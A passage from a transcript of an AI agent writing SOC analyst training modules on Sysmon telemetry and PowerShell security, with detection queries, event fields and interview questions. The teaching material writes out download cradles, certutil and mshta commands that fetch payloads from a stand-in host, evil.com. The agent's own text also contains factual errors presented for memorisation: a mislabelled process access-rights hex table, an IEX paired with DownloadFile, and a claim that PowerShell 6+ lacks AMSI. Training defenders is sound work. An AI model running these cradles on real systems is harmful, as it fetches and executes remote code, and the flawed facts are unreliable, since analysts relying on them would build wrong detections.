Living-off-land | `CERTUTIL.EXE -decode`, `MSHTA.EXE http://...` | T1218 |\n| Temp/AppData execution | `C:\\Users\\...\\AppData\\Local\\Temp\\abc.exe` | T1059 |\n| Unsigned binary | `Signed: false`, `Company: ` (empty) | T1036 |\n| Masquerading | `Image: svchost.exe`, `OriginalFileName: malware.exe` | T1036.003 |\n| High integrity child | `CMD.EXE (Medium)` → `POWERSHELL.EXE (High)` | T1548.002 |\n\n### EID 3: Network Connection\n\n```\nKey Fields:\n├── Image                    # Process making connection\n├── User\n├── SourceIp, SourcePort\n├── DestinationIp, DestinationPort\n├── Protocol                 # TCP / UDP\n├── DestinationHostname      # If resolved\n└── ProcessGuid              # Link to EID 1\n```\n\n**Suspicious Patterns**:\n| Pattern | Indicator |\n|---------|-----------|\n| **Beaconing** | Regular interval (60s, 5min), same destination, small bytes |\n| **C2 ports** | 80, 443, 8080, 8443, 53 (DNS), 22, 443 (non-browser) |\n| **Unusual process** | `POWERSHELL.EXE`, `RUNDLL32.EXE`, `SVCHOST.EXE` (non-system) making outbound |\n| **Data exfil** | Large upload (>10MB), cloud storage IPs, file sharing sites |\n| **Internal scanning** | Sequential ports, multiple destinations from single process |\n| **Non-standard protocol** | HTTP on 443, TLS on 80, custom ports |\n\n### EID 8: CreateRemoteThread — Code Injection\n\n```\nKey Fields:\n├── SourceImage              # Injector process\n├── TargetImage              # Victim process\n├── SourceProcessId\n├── TargetProcessId\n├── NewThreadId\n└── StartAddress             # Entry point (often shellcode)\n```\n\n**Legitimate**: Debuggers, AV/EDR, some installers.\n**Malicious**: Process hollowing, DLL injection, shellcode execution, Cobalt Strike `inject`, Metasploit `migrate`.\n\n**High-value targets**: `LSASS.EXE` (credential theft), `SVCHOST.EXE` (persistence), `EXPLORER.EXE` (user context), browser processes (session hijack).\n\n### EID 10: Process Access — LSASS Access, Token Manipulation\n\n```\nKey Fields:\n├── SourceImage\n├── TargetImage\n├── GrantedAccess (hex)      # Decode to rights\n├── SourceProcessId\n└── TargetProcessId\n```\n\n**Critical Access Rights (Memorize Hex)**:\n| Hex | Right | Attack |\n|-----|-------|--------|\n| `0x1FFFFF` | PROCESS_ALL_ACCESS | Full control |\n| `0x001F0FFF` | Standard + VM_READ/WRITE | Memory read/write |\n| `0x00001000` | PROCESS_VM_READ | Read memory (LSASS dump) |\n| `0x00000020` | PROCESS_VM_WRITE | Write memory (injection) |\n| `0x00000008` | PROCESS_VM_OPERATION | Memory ops |\n| `0x00000040` | PROCESS_QUERY_LIMITED_INFO | Basic info |\n| `0x00000100` | PROCESS_CREATE_THREAD | Remote thread (injection) |\n| `0x00000400` | PROCESS_DUP_HANDLE | Handle duplication |\n\n**LSASS Access**: `SourceImage` = suspicious (PowerShell, RUNDLL32, custom) + `TargetImage` = `LSASS.EXE` + `GrantedAccess` includes `0x1000` (VM_READ) → **CREDENTIAL THEFT**.\n\n### EID 11: File Create — Malware Drops, Staging, Persistence\n\n```\nKey Fields:\n├── TargetFilename           # Full path\n├── Image                    # Creator process\n├── Hashes                   # SHA256, MD5, IMPHASH\n├── CreationUtcTime\n└── ProcessGuid\n```\n\n**Suspicious Paths**:\n- `C:\\Users\\...\\AppData\\Local\\Temp\\*`\n- `C:\\Users\\...\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*`\n- `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*`\n- `C:\\Windows\\Tasks\\*`, `C:\\Windows\\System32\\Tasks\\*`\n- `C:\\PerfLogs\\*`, `C:\\Windows\\Temp\\*`\n- `\\\\?\\C:\\...` (NTFS alternate data streams)\n\n### EID 12/13/14: Registry — Persistence, Configuration\n\n```\nKey Fields:\n├── TargetObject             # Registry path\n├── Image                    # Modifier process\n├── Details                  # Value name/data (EID 13)\n├── NewName                  # EID 14\n└── ProcessGuid\n```\n\n**Critical Persistence Keys**:\n| Key | Technique |\n|-----|-----------|\n| `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\*` | User logon |\n| `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*` | Once |\n| `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\*` | Current user |\n| `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\*` | Policy |\n| `HKLM\\SYSTEM\\CurrentControlSet\\Services\\*` | Service persistence |\n| `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit` | Winlogon |\n| `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell` | Shell |\n| `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\\*` | BHO |\n| `HKLM\\SOFTWARE\\Classes\\CLSID\\{...}\\InprocServer32` | COM hijack |\n| `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs` | DLL hijack |\n\n### EID 22: DNS Query — C2, DGA, Tunneling\n\n```\nKey Fields:\n├── QueryName                # Domain queried\n├── QueryStatus              # 0=Success, else error code\n├── QueryResults             # Resolved IPs (comma-separated)\n├── Image                    # Process making query\n├── ProcessGuid\n└── User\n```\n\n**Suspicious Patterns**:\n| Pattern | Example |\n|---------|---------|\n| **DGA** | `x7k9m2p4q1w3e5r7t9y.example.com`, high entropy, NXDOMAIN |\n| **DNS Tunneling** | Long subdomains (`data.exfil.attacker.com`), TXT records, high query volume |\n| **Fast Flux** | Single domain → many IPs (round-robin), low TTL |\n| **C2 Domains** | Newly registered (<30 days), suspicious TLD (.tk, .ml, .ga, .cf, .top, .xyz) |\n| **Living-off-land** | `POWERSHELL.EXE`, `CMD.EXE`, `RUNDLL32.EXE` making DNS queries |\n| **Internal → External** | Workstation querying external DNS directly (bypass corporate DNS) |\n\n---\n\n## 5.4 Process Trees — Building and Analyzing\n\n### The Process Tree Concept\n```\nParent (PID 100) → Child (PID 200) → Grandchild (PID 300)\n      │                │                   │\n   Image: A       Image: B            Image: C\n   Cmd: ...       Cmd: ...            Cmd: ...\n   User: X        User: X             User: X\n```\n\n**In Sysmon**: Link via `ParentProcessGuid` → `ProcessGuid` (not PID).\n\n### Realistic Malicious Chain\n\n```\nEXPLORER.EXE (User context, Medium IL)\n  └── OUTLOOK.EXE (Email client)\n        └── WINWORD.EXE (Open attachment)\n              └── CMD.EXE /c \"powershell -enc JABjAGwA...\" (Macro execution)\n                    └── POWERSHELL.EXE -enc JABjAGwA... (Decoded: DownloadString)\n                          └── POWERSHELL.EXE IEX (New-Object Net.WebClient).DownloadString('http://c2/payload')\n                                └── RUNDLL32.EXE C:\\Temp\\payload.dll,EntryPoint (DLL execution)\n                                      └── POWERSHELL.EXE (C2 beacon)\n                                            └── CMD.EXE /c whoami (Discovery)\n                                            └── CMD.EXE /c net view (Discovery)\n```\n\n**Why this chain is suspicious**:\n1. `OUTLOOK` → `WINWORD` → `CMD` — **Office spawning shell** (phishing)\n2. `CMD` → `POWERSHELL -enc` — **Encoded command** (obfuscation)\n3. `POWERSHELL` → `POWERSHELL` (nested) — **Staging** (download cradle)\n4. `POWERSHELL` → `RUNDLL32` — **LOLBin** (DLL execution)\n5. `RUNDLL32` → `POWERSHELL` — **C2 beacon** (PowerShell common for C2)\n6. `POWERSHELL` → `CMD` (discovery) — **Post-exploitation**\n\n### Legitimate Chains (Know These to Avoid False Positives)\n\n```\n# Windows Update\nSERVICES.EXE → TIWORKER.EXE → DISMHOST.EXE → CMD.EXE (DISM)\n\n# Software Install\nMSIEXEC.EXE → CMD.EXE /c \"...\" → POWERSHELL.EXE (custom action)\n\n# Browser Update\nCHROME.EXE → CHROME.EXE (updater) → CMD.EXE /c \"...\"\n\n# Admin Script\nEXPLORER.EXE → CMD.EXE (admin) → POWERSHELL.EXE (script.ps1)\n\n# EDR/AV Scan\nMRT.EXE → CMD.EXE /c \"...\" (Microsoft Removal Tool)\n```\n\n---\n\n## 5.5 Sysmon Configuration — What L1 Should Know\n\n### SwiftOnSecurity Config (Community Standard)\n```xml\n<RuleGroup name=\"Default\">\n  <ProcessCreate onmatch=\"include\">  # EID 1 - ALL processes\n    <Image condition=\"is\">*</Image>\n  </ProcessCreate>\n  <FileCreate onmatch=\"include\">    # EID 11 - Targeted paths\n    <TargetFilename condition=\"begin with\">C:\\Users\\</TargetFilename>\n    <TargetFilename condition=\"begin with\">C:\\ProgramData\\</TargetFilename>\n    <TargetFilename condition=\"begin with\">C:\\Windows\\Temp\\</TargetFilename>\n    <TargetFilename condition=\"begin with\">C:\\Windows\\Tasks\\</TargetFilename>\n  </FileCreate>\n  <NetworkConnect onmatch=\"include\"> # EID 3 - ALL outbound\n    <Image condition=\"is\">*</Image>\n  </NetworkConnect>\n  <ImageLoad onmatch=\"include\">     # EID 7 - Unsigned/DLL\n    <Image condition=\"is\">*</Image>\n    <Signature condition=\"is\"></Signature>  # Unsigned only\n  </ImageLoad>\n  <CreateRemoteThread onmatch=\"include\"> # EID 8\n    <TargetImage condition=\"is\">C:\\Windows\\System32\\lsass.exe</TargetImage>\n    <TargetImage condition=\"is\">C:\\Windows\\System32\\svchost.exe</TargetImage>\n  </CreateRemoteThread>\n  <ProcessAccess onmatch=\"include\">  # EID 10 - LSASS, critical\n    <TargetImage condition=\"is\">C:\\Windows\\System32\\lsass.exe</TargetImage>\n    <GrantedAccess condition=\"bitmask\">0x1010</GrantedAccess>  # VM_READ | QUERY_LIMITED\n  </ProcessAccess>\n  <DnsQuery onmatch=\"include\">       # EID 22\n    <Image condition=\"is\">*</Image>\n  </DnsQuery>\n</RuleGroup>\n```\n\n### Key Config Decisions\n| Setting | Recommendation | Reason |\n|---------|----------------|--------|\n| **Process Create** | Include all (`*`) | Complete visibility |\n| **Network Connect** | Include all | C2 detection |\n| **File Create** | Targeted (Temp, Startup, Users) | Volume control |\n| **Image Load** | Unsigned only | Reduce noise, catch malware |\n| **CreateRemoteThread** | Target LSASS, svchost | Injection detection |\n| **ProcessAccess** | LSASS + VM_READ | Credential theft |\n| **DNS Query** | All | C2, tunneling, DGA |\n| **Registry** | Run keys, Services, Winlogon | Persistence |\n| **Pipe** | Include all | Lateral, C2 (Cobalt Strike) |\n| **WMI** | Include all | Persistence, lateral |\n\n---\n\n## 5.6 Sysmon Query Patterns (KQL)\n\n### Process Tree Reconstruction\n```kql\n// Build tree from root for a given ProcessGuid\nlet root_guid = \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\";\nSysmon\n| where EventID == 1\n| where ProcessGuid == root_guid\n| project UtcTime, ProcessGuid, ProcessId, Image, CommandLine, User, IntegrityLevel, Hashes, ParentProcessGuid, ParentImage, ParentCommandLine\n| join kind=leftouter (\n    Sysmon\n    | where EventID == 1\n    | project ChildGuid=ProcessGuid, ChildImage=Image, ChildCommandLine=CommandLine, ChildUser=User, ParentProcessGuid\n) on $left.ProcessGuid == $right.ParentProcessGuid\n```\n\n### Suspicious Office Spawn\n```kql\nSysmon\n| where EventID == 1\n| where ParentImage has_any (\"WINWORD.EXE\", \"EXCEL.EXE\", \"POWERPNT.EXE\", \"OUTLOOK.EXE\", \"MSACCESS.EXE\")\n| where Image has_any (\"POWERSHELL.EXE\", \"CMD.EXE\", \"WSCRIPT.EXE\", \"CSCRIPT.EXE\", \"RUNDLL32.EXE\", \"REGSVR32.EXE\", \"MSHTA.EXE\", \"CERTUTIL.EXE\")\n| project UtcTime, Computer, User, ParentImage, Image, CommandLine, Hashes\n```\n\n### LSASS Access (Credential Theft)\n```kql\nSysmon\n| where EventID == 10\n| where TargetImage =~ \"C:\\\\Windows\\\\System32\\\\lsass.exe\"\n| where GrantedAccess has_any (\"0x1010\", \"0x1FFFFF\", \"0x1F0FFF\", \"0x1000\", \"0x10\")\n| project UtcTime, Computer, SourceImage, TargetImage, GrantedAccess, SourceProcessId, TargetProcessId, User\n| join kind=leftouter (\n    Sysmon\n    | where EventID == 1\n    | project SourceProcessId=ProcessId, SourceImage=Image, SourceCommandLine=CommandLine, SourceUser=User\n) on SourceProcessId\n```\n\n### Beaconing Detection (Network)\n```kql\nSysmon\n| where EventID == 3\n| where Protocol == \"TCP\"\n| summarize Count=count(), Intervals=make_list(TimeGenerated), Destinations=make_set(DestinationIp) \n  by Image, Computer, DestinationIp, DestinationPort, bin(TimeGenerated, 1h)\n| where Count >= 6  // 6+ connections in 1 hour\n| extend AvgInterval = (max(Intervals) - min(Intervals)) / (Count - 1)\n| where AvgInterval between (30s .. 300s)  // Regular interval\n```\n\n### DGA Detection (DNS)\n```kql\nSysmon\n| where EventID == 22\n| where QueryStatus == 0  // Success\n| extend Entropy = calculate_shannon_entropy(QueryName)\n| where Entropy > 3.5\n| where QueryName matches regex @\"^[a-z0-9]{15,}\\.\"\n| summarize Count=count(), Domains=make_set(QueryName) by Image, Computer, User, bin(TimeGenerated, 1h)\n| where Count > 20\n```\n\n---\n\n## 5.7 Sysmon vs EDR vs Windows Events\n\n| Capability | Windows Security | Sysmon | EDR |\n|------------|------------------|--------|-----|\n| Process create + cmdline | Partial (GPO) | **Full** | **Full + behavior** |\n| Parent process | PID only | **Full + GUID** | **Full + tree** |\n| Hashes | No | **SHA256/MD5/IMPHASH** | **Multi-hash + reputation** |\n| Network | No | **EID 3** | **Full + TLS/JA3** |\n| File create | 4663 (SACL) | **EID 11 (targeted)** | **Full + sandbox** |\n| Registry | 4657 (SACL) | **EID 12/13/14 (targeted)** | **Full + behavior** |\n| DNS | No | **EID 22** | **Full + reputation** |\n| Memory injection | No | **EID 8, 10** | **Full + prevention** |\n| Tamper protection | No | Limited | **Kernel-level** |\n| Response | No | No | **Isolate, kill, rollback** |\n\n**Reality**: In MXDR, you get EDR telemetry (which includes Sysmon-like data). Know Sysmon because:\n1. EDR fields map to Sysmon concepts\n2. Some orgs use Sysmon + SIEM without EDR\n3. Understanding Sysmon makes you EDR-agnostic\n\n---\n\n## 5.8 Interview Questions for This Module\n\n1. **What is Sysmon Event ID 1 and why is it better than Windows 4688?**\n   - Always includes full command line, hashes (SHA256/MD5/IMPHASH), parent process GUID + command line, integrity level, OriginalFileName.\n\n2. **How do you link parent and child processes in Sysmon?**\n   - `ParentProcessGuid` (child) = `ProcessGuid` (parent). Not PID (recycles).\n\n3. **What does Sysmon EID 8 (CreateRemoteThread) indicate and what are high-value targets?**\n   - Cross-process thread injection. Targets: LSASS (credential theft), svchost (persistence), explorer (user context), browsers (session hijack).\n\n4. **What GrantedAccess values in EID 10 indicate LSASS memory reading?**\n   - `0x1000` (PROCESS_VM_READ), `0x1010` (VM_READ | QUERY_LIMITED), `0x1FFFFF` (ALL_ACCESS).\n\n5. **How do you detect DNS tunneling using Sysmon EID 22?**\n   - High entropy subdomains, long labels, high query volume, TXT record responses, success/NXDOMAIN pattern.\n\n6. **What are the key persistence registry keys monitored by Sysmon EID 12/13?**\n   - Run/RunOnce (HKLM/HKCU), Services, Winlogon Userinit/Shell, Browser Helper Objects, KnownDLLs, Session Manager.\n\n7. **Explain the suspicious process chain: WINWORD → CMD → POWERSHELL -enc → POWERSHELL → RUNDLL32 → POWERSHELL**\n   - Phishing attachment → macro → shell → encoded PS (obfuscation) → download cradle → LOLBin DLL execution → C2 beacon.\n\n8. **What Sysmon configuration does SwiftOnSecurity recommend for Process Create?**\n   - Include all (`<Image condition=\"is\">*</Image>`), no filtering.\n\n9. **How does Sysmon EID 3 (Network) differ from NDR?**\n   - Sysmon: Process-centric (which process), local only. NDR: Network-centric (full flow, east-west, encrypted metadata).\n\n10. **What is IMPHASH and why is it useful?**\n    - Import table hash — identifies malware families even when binary is recompiled/packed differently.\n\n---\n\n## 5.9 Study Checklist for Module 5\n\n- [ ] Recite all 26 Sysmon Event IDs and purpose\n- [ ] Deep-dive 8 critical EIDs: 1, 3, 8, 10, 11, 12/13/14, 22, 25\n- [ ] Memorize LSASS access rights hex: 0x1000, 0x1010, 0x1FFFFF\n- [ ] Build process tree from Sysmon EID 1 (ParentProcessGuid → ProcessGuid)\n- [ ] Analyze 5 malicious process chains vs 5 legitimate chains\n- [ ] Write KQL for: Office spawn, LSASS access, beaconing, DGA, file drop\n- [ ] Explain SwiftOnSecurity config rationale for each rule group\n- [ ] Compare Sysmon vs EDR vs Windows Events capabilities\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 6 — PowerShell Security*"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra Free · 18.6s)

_Thinking:_

Good, Module 5 is complete. Let me continue with Module 6 - PowerShell Security.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra Free · 143.3s)

_Thinking:_

Now let me create Module 6 - PowerShell Security.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 6: PowerShell Security\n\n**Priority: P0 — #1 attack vector. L1 must investigate PS alerts daily.**\n\n---\n\n## 6.1 PowerShell Basics for SOC\n\n### What is PowerShell?\n- **Task automation framework** built on .NET\n- **Command-line shell** + **Scripting language**\n- **Object-oriented pipeline** (not text like Bash)\n- **Full access** to .NET, WMI, COM, WinRM, CIM, REST APIs\n- **Default on Windows 7+**, Windows Server 2008 R2+\n\n### PowerShell Versions (Matters for Logging)\n| Version | Engine | Default On | Logging Capability |\n|---------|--------|------------|-------------------|\n| **2.0** | v2 | Win7/2008R2 | Minimal (no Script Block Logging) |\n| **3.0** | v3 | Win8/2012 | Module Logging only |\n| **4.0** | v4 | 8.1/2012R2 | Module Logging |\n| **5.0/5.1** | v5 | Win10/2016 | **Script Block Logging, Module Logging, AMSI** |\n| **6.0+ (Core)** | v6+ | Cross-platform | Script Block Logging, no AMSI (yet) |\n\n**Attackers love v2** (downgrade attack: `powershell -version 2` bypasses v5 logging/AMSI).\n\n---\n\n## 6.2 PowerShell Execution Flow\n\n```\nUser Input / Script\n        │\n        ▼\n┌───────────────────┐\n│   Parser          │  →  AST (Abstract Syntax Tree)\n└─────────┬─────────┘\n          │\n          ▼\n┌───────────────────┐\n│   Compiler        │  →  IL (Intermediate Language) / DynamicMethod\n└─────────┬─────────┘\n          │\n          ▼\n┌───────────────────┐\n│   Runtime (CLR)   │  →  Execution\n│   + AMSI Hook     │     (Scan here if enabled)\n└───────────────────┘\n```\n\n**Key Insight**: Everything is .NET. Reflection, `Invoke-Expression`, `Add-Type`, `[System.Reflection.Assembly]::Load()` all execute in-memory.\n\n---\n\n## 6.3 PowerShell Logging — The SOC Visibility Triad\n\n### 1. Module Logging (Event ID 4103)\n**What**: Logs pipeline execution (commands, parameters)\n**Where**: `Microsoft-Windows-PowerShell/Operational`\n**Enable**: GPO → Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging → `*`\n**Volume**: High (every command)\n**Value**: See *what ran*, but not full script content\n\n### 2. Script Block Logging (Event ID 4104) — **CRITICAL**\n**What**: Logs *entire script block* content (deobfuscated!)\n**Where**: `Microsoft-Windows-PowerShell/Operational`\n**Enable**: GPO → Turn on PowerShell Script Block Logging → Enable\n**Volume**: Medium (per script block)\n**Value**: **Sees through obfuscation** — logs *after* parsing, *before* execution\n\n### 3. Transcription (Text File)\n**What**: Full session transcript (input + output)\n**Where**: File share (configured via GPO)\n**Enable**: GPO → Turn on PowerShell Transcription\n**Volume**: High (text files)\n**Value**: Complete session replay, but file-based (not SIEM-friendly)\n\n### 4. AMSI (Antimalware Scan Interface)\n**What**: Real-time scanning of *in-memory* content (scripts, .NET assemblies, COM)\n**Where**: Integrated with Defender / AV\n**Enable**: Default on Win10+ with Defender\n**Value**: **Catches fileless malware**, reflective loading, `IEX`, `[Assembly]::Load()`\n\n---\n\n## 6.4 Event ID 4104 — Script Block Logging Deep Dive\n\n**This is your best friend. It shows the *deobfuscated* script.**\n\n```\nKey Fields:\n├── EventID: 4104\n├── ContextInfo:  (script name, path, or \"Command line\")\n├── ScriptBlockText:  THE FULL DEOBFUSCATED CODE\n├── ScriptBlockId:    GUID (correlate across events)\n├── Path:             Script file path (if file)\n├── User:             DOMAIN\\user\n├── Computer:\n├── Level:            Warning (suspicious) / Information (normal)\n├── Opcode:           Execute / Create / Close\n└── Message:          \"Creating Scriptblock text (1 of 1):\\n<code>\"\n```\n\n**Why it defeats obfuscation**:\n```\nAttacker sends:  powershell -enc \"JABjAGwAaQA...\"  (Base64 encoded)\n4104 logs:       $client = New-Object Net.WebClient; $client.DownloadString('http://evil.com/payload')\n```\nThe engine decodes, parses, *then* logs. You see the truth.\n\n---\n\n## 6.5 Common Attack Patterns in PowerShell\n\n### 1. Encoded Commands (`-enc` / `-encodedCommand`)\n```\nBase64(UTF-16LE) of the command string.\nDecoding:\n  $encoded = \"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEZ...\"\n  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))\n```\n**Detection**: `-enc`, `-encodedCommand`, `-e` in command line (4688, Sysmon EID 1, 4104)\n\n### 2. Download Cradles (Remote Code Execution)\n```powershell\n# Classic\nIEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\nIEX (New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe', \"$env:TEMP\\payload.exe\")\n\n# Modern (TLS, bypass)\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr -UseBasicParsing 'https://evil.com/payload.ps1')\n\n# One-liners\npowershell -c \"iwr http://evil.com/p.ps1 | iex\"\n```\n**Detection**: `DownloadString`, `DownloadFile`, `DownloadData`, `OpenRead`, `Invoke-WebRequest` (iwr), `Invoke-RestMethod` (irm), `Net.WebClient`, `System.Net.Http.HttpClient`\n\n### 3. Obfuscation Techniques\n| Technique | Example | Defeated By |\n|-----------|---------|-------------|\n| **String concatenation** | `'Down'+'load'+'String'` | 4104 (logs concatenated) |\n| **Variable substitution** | `$a='DownloadString'; $client.$a()` | 4104 |\n| **Format operator** | `-f \"Download{0}\" \"String\"` | 4104 |\n| **Character escaping** | `Do``wn`l`o`adString` | 4104 |\n| **Base64 encoding** | `-enc JABjAGwA...` | 4104 (decodes first) |\n| **Compression** | `[IO.Compression.GzipStream]...` | 4104 (decompresses) |\n| **AST manipulation** | `[ScriptBlock]::Create(...)` | 4104 (logs result) |\n| **Invoke-Expression (IEX)** | `IEX $obfuscated` | 4104 (logs expanded) |\n\n**Key Rule**: **Script Block Logging (4104) defeats almost all script-level obfuscation.** It logs *after* the parser resolves everything.\n\n### 4. Living-off-the-Land Binaries (LOLBins) via PowerShell\n```powershell\n# Certutil\ncertutil -decode /split bad.b64 bad.exe\ncertutil -urlcache -split -f http://evil.com/payload.exe bad.exe\n\n# Mshta\nmshta http://evil.com/payload.hta\nmshta vbscript:Execute(\"...\")\n\n# Regsvr32\nregsvr32 /s /n /u 